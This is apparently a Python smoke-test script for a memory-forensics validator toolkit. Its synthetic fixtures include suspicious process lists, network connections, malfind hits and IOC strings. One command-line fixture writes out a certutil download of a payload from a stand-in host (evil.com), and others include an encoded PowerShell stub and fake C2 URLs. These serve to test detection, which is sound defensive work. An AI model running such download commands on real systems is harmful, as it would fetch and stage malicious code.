# ===== Block 3 Smoke Tests: Memory Tools + Validators =====
import sys

print("=== Test 1: Import all memory validators ===")
from evidencechain.validators import (
    ProcessListValidator, NetworkValidator, MalfindValidator,
    ServiceValidator, CmdlineValidator, ProcessDumpValidator,
)
print("  All 6 memory validators imported OK")

print()
print("=== Test 2: Import memory tools ===")
from evidencechain.tools.memory import MemoryToolExecutor
print("  MemoryToolExecutor imported OK")

print()
print("=== Test 3: Process list validator (pslist) ===")
plv = ProcessListValidator()
sample_pslist = "PID,PPID,ImageFileName,Offset(V),Threads,Handles,SessionId,Wow64,CreateTime,ExitTime\n"
sample_pslist += "4,0,System,0xfa8000000000,120,1500,0,False,2024-03-10T06:00:00Z,\n"
sample_pslist += "456,4,smss.exe,0xfa8001000000,2,29,0,False,2024-03-10T06:00:01Z,\n"
sample_pslist += "1234,789,cmd.exe,0xfa8002000000,1,15,1,False,2024-03-16T14:20:00Z,\n"
sample_pslist += "5678,1234,evil.exe,0xfa8003000000,3,42,1,False,2024-03-16T14:22:00Z,\n"

result = plv.validate("EXE-mem001", sample_pslist, scan_type="pslist")
print(f"  Records: {result.record_count}")
assert result.record_count == 4, f"Expected 4, got {result.record_count}"
# cmd.exe should be flagged as suspicious LOLBin
cmd_atom = [a for a in result.atoms if a.raw_data["process_name"] == "cmd.exe"][0]
assert cmd_atom.raw_data["is_suspicious_lolbin"] == True
print(f"  cmd.exe flagged as LOLBin: True")
# System should NOT be flagged
sys_atom = [a for a in result.atoms if a.raw_data["process_name"] == "System"][0]
assert sys_atom.raw_data["is_suspicious_lolbin"] == False
print(f"  System flagged as LOLBin: False")
# All should have timestamps
assert len(result.atoms[0].timestamps) >= 1
print("  PASS")

print()
print("=== Test 4: Process list validator (psscan with hidden detection) ===")
# Simulate psscan finding a process not in pslist
pslist_pids = {4, 456, 1234, 5678}  # Known PIDs from pslist
sample_psscan = "PID,PPID,ImageFileName,Offset(V),Threads,Handles,SessionId,Wow64,CreateTime,ExitTime\n"
sample_psscan += "4,0,System,0xfa8000000000,120,1500,0,False,2024-03-10T06:00:00Z,\n"
sample_psscan += "9999,789,hidden_rootkit.exe,0xfa8009000000,2,10,1,False,2024-03-16T14:25:00Z,\n"

result = plv.validate("EXE-mem002", sample_psscan, scan_type="psscan", pslist_pids=pslist_pids)
print(f"  Records: {result.record_count}")
assert result.record_count == 2
# PID 9999 should be flagged as potentially hidden
hidden = [a for a in result.atoms if a.raw_data.get("potentially_hidden")]
print(f"  Hidden processes: {len(hidden)}")
assert len(hidden) == 1
assert hidden[0].raw_data["process_name"] == "hidden_rootkit.exe"
assert hidden[0].raw_data["pid"] == 9999
# Should have overclaim flag
assert any("HIDDEN PROCESS" in f.message for f in result.overclaim_flags)
print("  PASS")

print()
print("=== Test 5: Network validator (netscan) ===")
nv = NetworkValidator()
sample_net = "Offset(V),Proto,LocalAddr,LocalPort,ForeignAddr,ForeignPort,State,PID,Owner,Created\n"
sample_net += "0xfa8001,TCPv4,192.168.1.100,49152,93.184.216.34,443,ESTABLISHED,1234,chrome.exe,2024-03-16T14:20:00Z\n"
sample_net += "0xfa8002,TCPv4,192.168.1.100,49153,10.0.0.5,445,ESTABLISHED,5678,evil.exe,2024-03-16T14:22:00Z\n"
sample_net += "0xfa8003,TCPv4,192.168.1.100,49154,185.220.101.1,4444,CLOSE_WAIT,5678,evil.exe,2024-03-16T14:23:00Z\n"

result = nv.validate("EXE-mem003", sample_net, scan_type="netscan")
print(f"  Connections: {result.record_count}")
assert result.record_count == 3
# External connections (non-RFC1918)
external = [a for a in result.atoms if a.raw_data.get("is_external_connection")]
print(f"  External connections: {len(external)}")
assert len(external) == 2  # 93.184.216.34 and 185.220.101.1
# 10.0.0.5 is RFC1918 so NOT external
internal = [a for a in result.atoms if not a.raw_data.get("is_external_connection")]
assert len(internal) == 1
assert internal[0].raw_data["foreign_addr"] == "10.0.0.5"
# Should have netscan overclaim flag
assert any("HISTORICAL" in f.message for f in result.overclaim_flags)
print("  PASS")

print()
print("=== Test 6: Malfind validator with FP detection ===")
mfv = MalfindValidator()
sample_mf = "PID,Process,Start VPN,End VPN,Tag,Protection,CommitCharge,Hexdump,Disasm\n"
sample_mf += "1234,evil.exe,0x400000,0x401000,VadS,PAGE_EXECUTE_READWRITE,1,4D5A9000...,push ebp...\n"
sample_mf += "5678,w3wp.exe,0x500000,0x501000,VadS,PAGE_EXECUTE_READWRITE,1,4D5A9000...,mov eax...\n"
sample_mf += "9012,svchost.exe,0x600000,0x601000,VadS,PAGE_EXECUTE_READWRITE,1,4D5A9000...,call 0x...\n"

result = mfv.validate("EXE-mem004", sample_mf)
print(f"  Malfind hits: {result.record_count}")
assert result.record_count == 3
# w3wp.exe should be flagged as likely FP (.NET process)
fp_hits = [a for a in result.atoms if a.raw_data.get("likely_false_positive")]
print(f"  Likely false positives: {len(fp_hits)}")
assert len(fp_hits) == 1
assert fp_hits[0].raw_data["process_name"] == "w3wp.exe"
# evil.exe and svchost.exe should NOT be FPs
true_hits = [a for a in result.atoms if not a.raw_data.get("likely_false_positive")]
assert len(true_hits) == 2
# Should have code injection overclaim
assert any("code injection" in f.message.lower() for f in result.overclaim_flags)
print("  PASS")

print()
print("=== Test 7: Service validator ===")
sv = ServiceValidator()
sample_svc = "Name,Display,Binary,State,Start,Type,PID\n"
sample_svc += "FakeService,Fake Service,C:\\Windows\\Temp\\svc.exe,SERVICE_RUNNING,SERVICE_AUTO_START,SERVICE_WIN32_OWN_PROCESS,1234\n"
sample_svc += "Spooler,Print Spooler,C:\\Windows\\System32\\spoolsv.exe,SERVICE_RUNNING,SERVICE_AUTO_START,SERVICE_WIN32_OWN_PROCESS,789\n"

result = sv.validate("EXE-mem005", sample_svc)
print(f"  Services: {result.record_count}")
assert result.record_count == 2
# Should extract binary paths as file references
fake_svc = [a for a in result.atoms if a.raw_data["service_name"] == "FakeService"][0]
assert len(fake_svc.file_references) > 0
print(f"  FakeService binary: {fake_svc.file_references[0]}")
print("  PASS")

print()
print("=== Test 8: Cmdline validator with suspicious pattern detection ===")
cv = CmdlineValidator()
sample_cmd = "PID,Process,Args\n"
sample_cmd += "1234,cmd.exe,cmd.exe /c whoami\n"
sample_cmd += "5678,powershell.exe,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0A...\n"
sample_cmd += "9012,certutil.exe,certutil.exe -urlcache -split -f http://evil.com/payload.exe\n"
sample_cmd += "1111,notepad.exe,notepad.exe C:\\Users\\admin\\notes.txt\n"

result = cv.validate("EXE-mem006", sample_cmd)
print(f"  Processes: {result.record_count}")
assert result.record_count == 4
# powershell with -enc should be flagged
ps_atom = [a for a in result.atoms if a.raw_data["pid"] == 5678][0]
assert ps_atom.raw_data["has_encoded_command"] == True
assert "encoded_powershell" in ps_atom.raw_data["suspicious_patterns"]
print(f"  PowerShell encoded detected: True")
# certutil with -urlcache should be flagged
cert_atom = [a for a in result.atoms if a.raw_data["pid"] == 9012][0]
assert "lolbin_download" in cert_atom.raw_data["suspicious_patterns"]
print(f"  Certutil LOLBin download detected: True")
# notepad should NOT be suspicious
note_atom = [a for a in result.atoms if a.raw_data["pid"] == 1111][0]
assert len(note_atom.raw_data["suspicious_patterns"]) == 0
print(f"  Notepad suspicious: False")
print("  PASS")

print()
print("=== Test 9: Process dump validator (strings IOC extraction) ===")
pdv = ProcessDumpValidator()
sample_strings = """some normal string
http://evil-c2-server.com/beacon
192.168.1.1
185.220.101.55
another string here
https://malware-download.xyz/payload.dll
evil-domain.top
127.0.0.1
normal text line
"""

result = pdv.validate("EXE-mem007", sample_strings, pid=5678, process_name="evil.exe")
print(f"  Atoms: {len(result.atoms)}")
assert len(result.atoms) == 1
ioc = result.atoms[0].raw_data
print(f"  URLs found: {ioc['total_urls']}")
assert ioc["total_urls"] == 2  # http://evil-c2... and https://malware-download...
print(f"  IPs found: {ioc['total_ips']}")
assert ioc["total_ips"] >= 2  # 185.220.101.55 and 192.168.1.1 (127.0.0.1 is filtered)
print(f"  Domains found: {ioc['total_domains']}")
assert ioc["total_domains"] >= 1  # evil-domain.top
# Should have IOC extraction warning
assert any("IOCs extracted" in w.message for w in result.warnings)
print("  PASS")

print()
print("=== Test 10: MemoryToolExecutor initialization ===")
from evidencechain.provenance.evidence_store import EvidenceStore
from evidencechain.provenance.audit_logger import AuditLogger
from evidencechain.provenance.evidence_registry import EvidenceRegistry
store = EvidenceStore()
audit_log = AuditLogger()
reg = EvidenceRegistry()
mt = MemoryToolExecutor(store, audit_log, reg)
# Verify all methods exist
for method in ["memory_process_list", "memory_network_connections",
               "memory_injected_code", "memory_services",
               "memory_command_lines", "memory_dump_process"]:
    assert hasattr(mt, method), f"Missing method: {method}"
print(f"  All 6 memory tool methods present")
print("  PASS")

print()
print("=== Test 11: Server dispatch table includes memory tools ===")
import importlib
mod = importlib.import_module("evidencechain.server")
dispatch = mod._TOOL_DISPATCH
print(f"  Dispatch table has {len(dispatch)} entries")
assert len(dispatch) >= 15, f"Expected >= 15 (9 disk + 6 memory), got {len(dispatch)}"
for tool_name in ["memory_process_list", "memory_network_connections",
                   "memory_injected_code", "memory_services",
                   "memory_command_lines", "memory_dump_process"]:
    assert tool_name in dispatch, f"Missing from dispatch: {tool_name}"
print("  All 6 memory tools in dispatch table")
print("  PASS")

print()
print("=== Test 12: RFC1918 detection ===")
assert nv._is_rfc1918("10.0.0.1") == True
assert nv._is_rfc1918("172.16.0.1") == True
assert nv._is_rfc1918("172.31.255.255") == True
assert nv._is_rfc1918("172.32.0.1") == False
assert nv._is_rfc1918("192.168.1.1") == True
assert nv._is_rfc1918("127.0.0.1") == True
assert nv._is_rfc1918("8.8.8.8") == False
assert nv._is_rfc1918("185.220.101.1") == False
print("  All RFC1918 checks passed")
print("  PASS")

print()
print("=" * 50)
print("ALL 12 BLOCK 3 SMOKE TESTS PASSED")
print("=" * 50)
